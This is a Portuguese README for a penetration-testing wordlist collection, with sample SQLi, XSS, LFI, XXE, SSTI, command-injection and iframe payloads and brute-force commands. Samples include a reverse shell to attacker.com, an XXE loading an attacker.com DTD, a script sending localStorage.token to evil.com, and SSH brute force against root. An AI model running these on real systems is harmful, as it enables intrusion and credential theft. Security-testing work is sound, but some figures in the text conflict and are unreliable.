# Penetration Testing Wordlists

Coleção abrangente de wordlists para testes de segurança.

## 📚 Wordlists Disponíveis

### 1. **sqli.txt** (200+ payloads)
Payloads de SQL Injection para diversos DBMSs.

**Cobertura:**
- MySQL / MariaDB
- PostgreSQL
- Microsoft SQL Server
- Oracle
- SQLite
- Time-based blind SQLi
- Boolean-based blind SQLi
- UNION-based SQLi
- Error-based SQLi
- Stacked queries

**Exemplos:**
```sql
' OR '1'='1
' UNION SELECT NULL--
'; DROP TABLE users--
' AND SLEEP(5)--
' OR EXTRACTVALUE(1,CONCAT(0x7e,version()))--
```

**Uso:**
```bash
# Selenium Interactive
python3 selenium_interactive.py https://target.com

# Console Tester
python3 console_tester.py https://target.com
```

### 2. **xss.txt** (200+ payloads)
Payloads de Cross-Site Scripting.

**Tipos:**
- Reflected XSS
- Stored XSS
- DOM-based XSS
- Bypass de filtros
- Encoded payloads
- Event handlers
- SVG-based XSS
- HTML5 vectors

**Exemplos:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(document.cookie)
<iframe src=javascript:alert(1)>
```

**Uso:**
```bash
# Teste XSS interativo
# Clique no input e pressione Ctrl+X
```

### 3. **lfi.txt** (200+ payloads)
Local File Inclusion e Path Traversal.

**Cobertura:**
- Linux paths
- Windows paths
- PHP wrappers
- URL encoding
- Double encoding
- Null byte injection
- Filter bypass

**Exemplos:**
```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
php://filter/convert.base64-encode/resource=/etc/passwd
C:\windows\win.ini
file:///etc/passwd
```

**Uso:**
```bash
# Selenium Interactive - Ctrl+L
# Testa automaticamente LFI/Path Traversal
```

### 4. **usernames.txt** (300+ usernames)
Usernames comuns para brute force.

**Categorias:**
- Default usernames (admin, root, user)
- Service accounts
- Database users
- Web services
- DevOps tools
- Cloud platforms
- Application defaults

**Exemplos:**
```
admin
administrator
root
webadmin
sysadmin
jenkins
gitlab
docker
postgres
```

**Uso:**
```bash
# Brute Force plugin
python3 brute_force.py https://target.com/login '{
    "protocol": "http-form",
    "username_list": "wordlists/usernames.txt",
    "password_list": "wordlists/passwords.txt"
}'
```

### 5. **passwords.txt** (400+ passwords)
Senhas comuns para brute force.

**Categorias:**
- Senhas mais comuns
- Variações de admin/password
- Senhas com números
- Senhas com símbolos
- Senhas padrão de serviços
- Senhas baseadas em datas

**Exemplos:**
```
123456
password
admin123
P@ssw0rd
P@ssword123
default
changeme
```

**Uso:**
```bash
# SSH Brute Force
python3 brute_force.py 192.168.1.100 '{
    "protocol": "ssh",
    "username": "root",
    "password_list": "wordlists/passwords.txt"
}'
```

### 6. **rce.txt** (150+ payloads)
Remote Code Execution e Command Injection.

**Cobertura:**
- Linux commands
- Windows commands
- Command separators (;, |, &&, &)
- Backticks e $()
- Reverse shells
- Bind shells
- File upload RCE
- URL-based RCE

**Exemplos:**
```bash
; ls
| whoami
&& cat /etc/passwd
`id`
$(uname -a)
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**Uso:**
```bash
# Console Tester - Custom test
JS> fetch('/api/exec?cmd=ls')
```

### 7. **xxe.txt** (50+ payloads)
XML External Entity Injection.

**Cobertura:**
- Basic XXE
- Blind XXE
- Error-based XXE
- Out-of-band XXE
- XXE via SVG
- XXE via XLSX/DOCX
- Cloud metadata access
- File exfiltration

**Exemplos:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
```

**Uso:**
```bash
# Selenium Fuzzer
python3 selenium_fuzzer.py https://target.com/upload '{
    "wordlist": "wordlists/xxe.txt"
}'
```

### 8. **ssti.txt** (100+ payloads)
Server-Side Template Injection.

**Engines:**
- Jinja2 (Python/Flask)
- Twig (PHP)
- Freemarker (Java)
- Velocity (Java)
- ERB (Ruby)
- Thymeleaf (Java)
- Smarty (PHP)
- Handlebars (Node.js)

**Exemplos:**
```python
{{7*7}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
${T(java.lang.Runtime).getRuntime().exec('id')}
<%= system("whoami") %>
```

**Uso:**
```bash
# Console Tester
JS> fetch('/render', {
    method: 'POST',
    body: JSON.stringify({template: '{{7*7}}'})
})
```

### 9. **iframe.txt** (170+ payloads)
Iframe Injection e Clickjacking.

**Cobertura:**
- Basic iframe injection
- JavaScript protocol handlers
- Data URI schemes
- Iframe sandbox bypass
- Clickjacking vectors
- UI redressing
- Framejacking techniques
- X-Frame-Options bypass
- PostMessage exploits
- Storage access via iframe
- CSS injection in iframe
- Encoded iframes

**Tipos de Ataque:**
- **Iframe Injection:** Injeção de iframes maliciosos
- **Clickjacking:** Sobreposição transparente de frames
- **UI Redressing:** Manipulação da interface do usuário
- **Frame-based XSS:** XSS através de iframes
- **Data Exfiltration:** Roubo de dados via iframes
- **CORS Bypass:** Contorno de políticas de mesma origem

**Exemplos:**
```html
<!-- Basic Injection -->
<iframe src="javascript:alert(1)"></iframe>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>

<!-- Clickjacking -->
<iframe src="https://victim.com" style="opacity:0;position:absolute"></iframe>

<!-- Sandbox Bypass -->
<iframe sandbox="allow-scripts" src="javascript:alert(1)"></iframe>

<!-- PostMessage Exploit -->
<iframe src="https://victim.com" onload="this.contentWindow.postMessage({admin:true},'*')"></iframe>

<!-- Data Exfiltration -->
<iframe srcdoc="<script>fetch('https://evil.com/?data='+localStorage.token)</script>"></iframe>
```

**Uso:**
```bash
# Selenium Interactive - Ctrl+F
# Testa automaticamente iframe injection e clickjacking

# Manual testing
python3 plugins/interactive-testing/selenium_interactive/selenium_interactive.py https://target.com

# No browser:
# 1. Click em input field
# 2. Pressione Ctrl+F
# 3. Aguarde testes de iframe injection
```

**Detecção:**
- Busca por iframes injetados no HTML
- Verifica atributos perigosos (javascript:, data:, srcdoc=)
- Checa presença de X-Frame-Options header
- Analisa CSP frame-ancestors directive
- Identifica iframes com event handlers
- Detecta tentativas de clickjacking

**Indicadores de Vulnerabilidade:**
```javascript
// Falta de proteção contra clickjacking
X-Frame-Options: (ausente)
Content-Security-Policy: (sem frame-ancestors)

// Iframe injection bem-sucedida
<iframe src="javascript:alert(1)"></iframe> (presente no HTML)
```

## 📊 Estatísticas

| Wordlist | Payloads | Tamanho | Tipos |
|----------|----------|---------|-------|
| sqli.txt | 200+ | ~15KB | MySQL, PostgreSQL, MSSQL, Oracle |
| xss.txt | 200+ | ~20KB | Reflected, Stored, DOM, Bypass |
| lfi.txt | 200+ | ~12KB | Linux, Windows, PHP Wrappers |
| usernames.txt | 300+ | ~3KB | Default, Services, DevOps |
| passwords.txt | 400+ | ~4KB | Common, Complex, Default |
| rce.txt | 150+ | ~10KB | Linux, Windows, Shells |
| xxe.txt | 50+ | ~8KB | Basic, Blind, OOB |
| ssti.txt | 100+ | ~12KB | Multiple engines |
| iframe.txt | 170+ | ~18KB | Injection, Clickjacking, Bypass |

**Total:** 1,770+ payloads únicos

## 🎯 Uso com Plugins

### Selenium Interactive

```bash
# As wordlists são carregadas automaticamente
python3 plugins/interactive-testing/selenium_interactive/selenium_interactive.py https://target.com

# No browser:
# Ctrl+I = Testa todos os SQLi payloads
# Ctrl+X = Testa todos os XSS payloads
# Ctrl+L = Testa todos os LFI payloads
# Ctrl+F = Testa todos os Iframe Injection payloads
# Ctrl+C = Testa API via JavaScript console
# Ctrl+Q = Sair
```

### Selenium Fuzzer

```bash
# Especificar wordlist customizada
python3 plugins/web-testing/selenium_fuzzer/selenium_fuzzer.py https://target.com '{
    "mode": "param",
    "wordlist": "wordlists/xss.txt"
}'

# Múltiplas wordlists
python3 plugins/web-testing/selenium_fuzzer/selenium_fuzzer.py https://target.com '{
    "mode": "form",
    "wordlist": ["wordlists/sqli.txt", "wordlists/xss.txt"]
}'
```

### Brute Force

```bash
# HTTP Form
python3 plugins/authentication-testing/brute_force/brute_force.py https://target.com/login '{
    "protocol": "http-form",
    "username_list": "wordlists/usernames.txt",
    "password_list": "wordlists/passwords.txt",
    "success_string": "Welcome"
}'

# SSH
python3 plugins/authentication-testing/brute_force/brute_force.py 192.168.1.100 '{
    "protocol": "ssh",
    "username_list": "wordlists/usernames.txt",
    "password_list": "wordlists/passwords.txt"
}'
```

### Console Tester

```bash
python3 console-testing/console_tester.py https://target.com '{"interactive": true}'

# No modo interativo:
JS> // Carregar wordlist
    const payloads = await fetch('/wordlists/xss.txt').then(r => r.text()).then(t => t.split('\n'));

JS> // Testar cada payload
    for (const payload of payloads) {
        const result = await fetch('/search?q=' + encodeURIComponent(payload));
        if (result.ok) console.log('Tested:', payload);
    }
```

## 🛠️ Customização

### Criar Wordlist Própria

```bash
# Adicionar novos payloads
echo "my_custom_payload" >> wordlists/sqli.txt

# Combinar wordlists
cat wordlists/sqli.txt wordlists/xss.txt > wordlists/combined.txt

# Filtrar por tipo
grep "UNION" wordlists/sqli.txt > wordlists/sqli_union.txt

# Remover duplicatas
sort -u wordlists/passwords.txt > wordlists/passwords_unique.txt
```

### Gerar Variações

```python
# generate_variants.py
base_payloads = ["<script>alert(1)</script>", "' OR 1=1--"]
encodings = ['url', 'html', 'base64', 'unicode']

for payload in base_payloads:
    for encoding in encodings:
        variant = encode(payload, encoding)
        print(variant)
```

## 📋 Melhores Práticas

### 1. Começar com Wordlists Pequenas
```bash
# Testar primeiro com subset
head -10 wordlists/sqli.txt > wordlists/sqli_quick.txt
```

### 2. Usar Rate Limiting
```bash
# Adicionar delay entre testes
python3 selenium_interactive.py https://target.com '{
    "delay": 1.0
}'
```

### 3. Filtrar por Contexto
```bash
# Apenas payloads básicos
grep -v "UNION" wordlists/sqli.txt > wordlists/sqli_basic.txt

# Apenas time-based
grep "SLEEP\|WAITFOR\|pg_sleep" wordlists/sqli.txt > wordlists/sqli_time.txt
```

### 4. Combinar com Ferramentas
```bash
# Com sqlmap
sqlmap -u "http://target.com?id=1" --file-read=wordlists/sqli.txt

# Com ffuf
ffuf -u http://target.com/FUZZ -w wordlists/lfi.txt

# Com wfuzz
wfuzz -u http://target.com?file=FUZZ -w wordlists/lfi.txt
```

## 🔒 Considerações de Segurança

⚠️ **Importante:**
- Use apenas em ambientes autorizados
- Algumas payloads podem causar:
  - DoS (Denial of Service)
  - Danos ao sistema
  - Perda de dados
- Sempre tenha backup
- Teste em ambiente isolado primeiro
- Respeite rate limits e termos de serviço

## 📚 Fontes e Referências

As wordlists foram compiladas de:
- [OWASP](https://owasp.org/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [FuzzDB](https://github.com/fuzzdb-project/fuzzdb)
- [XSS Payloads](http://www.xss-payloads.com/)
- Research papers e CVEs
- Bug bounty reports

## 🔄 Atualizações

Para manter as wordlists atualizadas:

```bash
# Pull de repositórios
git clone https://github.com/swisskyrepo/PayloadsAllTheThings
git clone https://github.com/danielmiessler/SecLists

# Extrair payloads relevantes
cat PayloadsAllTheThings/SQL\ Injection/Intruder/*.txt > wordlists/sqli_extended.txt

# Merge com wordlists existentes
cat wordlists/sqli.txt wordlists/sqli_extended.txt | sort -u > wordlists/sqli_merged.txt
```

## 📞 Contribuindo

Para adicionar novos payloads:

1. Teste o payload em ambiente controlado
2. Verifique se não é duplicata
3. Adicione comentário se necessário
4. Mantenha formatação consistente
5. Atualize este README

## ⚖️ License

Estas wordlists são para fins educacionais e testes autorizados apenas.

---

**Última atualização:** 2024
**Total de payloads:** 1,600+
**Categorias:** 8
**Maintained by:** Penetration Test Suite
